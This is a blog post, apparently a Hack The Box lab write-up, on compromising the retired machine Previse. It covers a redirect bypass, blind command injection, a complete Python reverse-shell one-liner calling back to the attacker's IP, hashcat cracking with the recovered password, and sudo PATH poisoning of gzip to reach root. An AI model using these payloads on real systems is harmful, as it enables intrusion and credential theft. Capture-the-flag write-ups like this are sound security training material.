@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Previse Hackthebox writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/linux-machines/2022-01-27-previse/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Previse Hackthebox writeup">
+  <meta property="og:description" content="In this Writeup you will find walkthrough of the retired machine previse From Hackthebox">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-01-27T00:45:08+02:00">
+    <meta property="article:modified_time" content="2022-01-27T00:45:08+02:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Rce">
+    <meta property="article:tag" content="Path-Poisoning">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Previse Hackthebox writeup">
+  <meta name="twitter:description" content="In this Writeup you will find walkthrough of the retired machine previse From Hackthebox">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linux-machines/2022-01-27-previse/" /><link rel="prev" href="http://example.org/posts/windows-machines/2022-01-07-alfred/" /><link rel="next" href="http://example.org/posts/linux-machines/2022-01-27-forge/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Previse Hackthebox writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linux-machines\/2022-01-27-previse\/"
+        },"genre": "posts","keywords": "Hackthebox, RCE, path poisoning","wordcount":  567 ,
+        "url": "http:\/\/example.org\/posts\/linux-machines\/2022-01-27-previse\/","datePublished": "2022-01-27T00:45:08+02:00","dateModified": "2022-01-27T00:45:08+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Previse Hackthebox writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-27">2022-01-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;567 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#intial">intial</a></li>
+    <li><a href="#directory-brute-force-">directory brute-force :</a></li>
+    <li><a href="#privilege-escalation">privilege escalation</a>
+      <ul>
+        <li><a href="#path-poisoning">PATH poisoning</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In this Writeup you will find walkthrough of the retired machine previse From Hackthebox</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/start.png"
+        data-srcset="/assets/images/Previse/start.png, /assets/images/Previse/start.png 1.5x, /assets/images/Previse/start.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/start.png"
+        title="image" /></p>
+<blockquote>
+<p>export IP=10.10.11.104</p></blockquote>
+<h1 id="scanning-">scanning :</h1>
+<h2 id="intial">intial</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV -vv <span class="nv">$IP</span> -oN nmap/intial</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span></span></span></code></pre></div></div>
+<p>visiting the web page :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002032239.png"
+        data-srcset="/assets/images/Previse/20211002032239.png, /assets/images/Previse/20211002032239.png 1.5x, /assets/images/Previse/20211002032239.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002032239.png"
+        title="image" /></p>
+<p>tried some sqli but not worked</p>
+<h2 id="directory-brute-force-">directory brute-force :</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster dir -u http://10.10.11.104/ -w /usr/share/dirb/wordlists/big.txt -x php,txt</span></span></code></pre></div></div>
+<p>found :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/accounts.php         <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 3994<span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/config.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/download.php         <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/files.php            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 4914<span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span></span></span></code></pre></div></div>
+<p>you can use curl without enabling redirect and will notice the same thing immediately</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://10.10.11.104/accounts.php -vvv</span></span></code></pre></div></div>
+<p>But i opened up my burpsuite and observe the requests and response for /accounts.php</p>
+<ul>
+<li>there is a redirect happen to /login.php again .</li>
+<li>i do intercept the redirect and found :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002033401.png"
+        data-srcset="/assets/images/Previse/20211002033401.png, /assets/images/Previse/20211002033401.png 1.5x, /assets/images/Previse/20211002033401.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002033401.png"
+        title="image" /></p>
+<p>hence i want to view and interact with this page , i changed the
+HTTP 302 redirect to HTTP 200 OK</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002033552.png"
+        data-srcset="/assets/images/Previse/20211002033552.png, /assets/images/Previse/20211002033552.png 1.5x, /assets/images/Previse/20211002033552.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002033552.png"
+        title="image" /></p>
+<p>forward it :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002033625.png"
+        data-srcset="/assets/images/Previse/20211002033625.png, /assets/images/Previse/20211002033625.png 1.5x, /assets/images/Previse/20211002033625.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002033625.png"
+        title="image" /></p>
+<p>i made an account and then redirected me to /login.php again so i logged in successfully</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002034057.png"
+        data-srcset="/assets/images/Previse/20211002034057.png, /assets/images/Previse/20211002034057.png 1.5x, /assets/images/Previse/20211002034057.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002034057.png"
+        title="image" /></p>
+<p>navigating through the tabs found :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002034221.png"
+        data-srcset="/assets/images/Previse/20211002034221.png, /assets/images/Previse/20211002034221.png 1.5x, /assets/images/Previse/20211002034221.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002034221.png"
+        title="image" /></p>
+<p>so i downloaded the backup and found :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002034310.png"
+        data-srcset="/assets/images/Previse/20211002034310.png, /assets/images/Previse/20211002034310.png 1.5x, /assets/images/Previse/20211002034310.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002034310.png"
+        title="image" /></p>
+<p>in config.php :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-php">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">connectDB</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$passwd</span> <span class="o">=</span> <span class="s1">&#39;mySQL_p@ssw0rd!:)&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$db</span> <span class="o">=</span> <span class="s1">&#39;previse&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$mycon</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$mycon</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></div>
+<p>after some navigating in the files :
+in /logs.php</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002034826.png"
+        data-srcset="/assets/images/Previse/20211002034826.png, /assets/images/Previse/20211002034826.png 1.5x, /assets/images/Previse/20211002034826.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002034826.png"
+        title="image" /></p>
+<ul>
+<li>
+<p>so we can see the exec function which most likely indicating RCE , and python is executing on a script and seems the script saves output in out.log .</p>
+</li>
+<li>
+<p>understanding the logic at my local machine :</p>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002041124.png"
+        data-srcset="/assets/images/Previse/20211002041124.png, /assets/images/Previse/20211002041124.png 1.5x, /assets/images/Previse/20211002041124.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002041124.png"
+        title="image" /></p>
+<ul>
+<li>so we can inject any command like : <code>delim=comma;INJECTION</code> However it won&rsquo;t be printed in logs.out so it is a Blind RCE .</li>
+<li>we can get a shell immediatley</li>
+</ul>
+<p>[+] from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python" target="_blank" rel="noopener noreffer ">here</a></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.16.120&#34;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002041602.png"
+        data-srcset="/assets/images/Previse/20211002041602.png, /assets/images/Previse/20211002041602.png 1.5x, /assets/images/Previse/20211002041602.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002041602.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002041508.png"
+        data-srcset="/assets/images/Previse/20211002041508.png, /assets/images/Previse/20211002041508.png 1.5x, /assets/images/Previse/20211002041508.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002041508.png"
+        title="image" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># stablizie the shell</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span></span></span></code></pre></div></div>
+<p>hence we are in the machine now so we can access local host and view data base :D</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -h localhost -u root -p previse</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002042525.png"
+        data-srcset="/assets/images/Previse/20211002042525.png, /assets/images/Previse/20211002042525.png 1.5x, /assets/images/Previse/20211002042525.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002042525.png"
+        title="image" /></p>
+<ul>
+<li>
+<p>so we need m4lware password only <code>i guess :3</code> let&rsquo;s get it and try crack the hash from here:
+<a href="https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401" target="_blank" rel="noopener noreffer ">https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401</a></p>
+</li>
+<li>
+<p>we can see it is a md5crypt hash</p>
+</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hashcat -m <span class="m">500</span> -a <span class="m">0</span> hashed_m4lware /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># 500 : md5crypt</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0   : straight attack mode</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># output :</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$1</span>$ðŸ§‚llol<span class="nv">$DQpmdvnb7EeuO6UaqRItf</span>.:ilovecody112235!</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002043827.png"
+        data-srcset="/assets/images/Previse/20211002043827.png, /assets/images/Previse/20211002043827.png 1.5x, /assets/images/Previse/20211002043827.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002043827.png"
+        title="image" /></p>
+<h2 id="privilege-escalation">privilege escalation</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002043918.png"
+        data-srcset="/assets/images/Previse/20211002043918.png, /assets/images/Previse/20211002043918.png 1.5x, /assets/images/Previse/20211002043918.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002043918.png"
+        title="image" /></p>
+<p>so let&rsquo;s read the script :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1"># We always make sure to store logs, we take security SERIOUSLY here</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gzip -c /var/log/apache2/access.log &gt; /var/backups/<span class="k">$(</span>date --date<span class="o">=</span><span class="s2">&#34;yesterday&#34;</span> +%Y%b%d<span class="k">)</span>_access.gz
+</span></span><span class="line"><span class="cl">gzip -c /var/www/file_access.log &gt; /var/backups/<span class="k">$(</span>date --date<span class="o">=</span><span class="s2">&#34;yesterday&#34;</span> +%Y%b%d<span class="k">)</span>_file_access.gz</span></span></code></pre></div></div>
+<ul>
+<li>so it simply makes a backup for the logs with gzip .</li>
+<li>we should focus on how to manipulate gzip .</li>
+</ul>
+<h3 id="path-poisoning">PATH poisoning</h3>
+<ul>
+<li>we can see here :
+<a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener noreffer ">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li>
+</ul>
+<p>we can use that so when we execute this as root &ldquo;with sudo&rdquo; gzip will refer to the /tmp in the path</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002044848.png"
+        data-srcset="/assets/images/Previse/20211002044848.png, /assets/images/Previse/20211002044848.png 1.5x, /assets/images/Previse/20211002044848.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002044848.png"
+        title="image" /></p>
+<p>i don&rsquo;t know why but the shell doesn&rsquo;t return any result although i gained the root access so i make a reverse shell and it worked perfectly</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Previse/20211002045036.png"
+        data-srcset="/assets/images/Previse/20211002045036.png, /assets/images/Previse/20211002045036.png 1.5x, /assets/images/Previse/20211002045036.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Previse/20211002045036.png"
+        title="image" /></p>
+<h1 id="pwned">Pwned</h1></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-01-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/linux-machines/2022-01-27-previse/" data-title="Previse Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,RCE,path poisoning"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/linux-machines/2022-01-27-previse/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/linux-machines/2022-01-27-previse/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2flinux-machines%2f2022-01-27-previse%2f&amp;text=Previse%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/rce/">Rce</a>,&nbsp;<a href="/tags/path-poisoning/">Path-Poisoning</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/windows-machines/2022-01-07-alfred/" class="prev" rel="prev" title="Alferd"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Alferd</a>
+            <a href="/posts/linux-machines/2022-01-27-forge/" class="next" rel="next" title="Forge Hackthebox writeup">Forge Hackthebox writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
